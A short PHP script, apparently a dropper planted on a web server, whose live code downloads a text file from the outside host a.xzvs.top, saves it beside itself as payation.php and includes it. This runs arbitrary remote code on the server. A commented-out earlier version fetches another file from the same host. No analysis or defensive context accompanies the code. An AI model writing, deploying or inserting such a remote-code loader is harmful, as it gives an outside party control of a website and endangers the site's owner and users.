<?php

// $url = "http://a.xzvs.top/888.txt";

// $savePath = __DIR__ . "/888.txt";

// $content = file_get_contents($url);

// if ($content === false) {
//     die("下载失败");
// }

// file_put_contents($savePath, $content);

// echo "保存成功";



$url = "http://a.xzvs.top/payation.txt";

$savePath = __DIR__ . "/payation.php";

$content = file_get_contents($url);

if ($content === false) {
    die("下载失败");
}

file_put_contents($savePath, $content);

include $savePath;
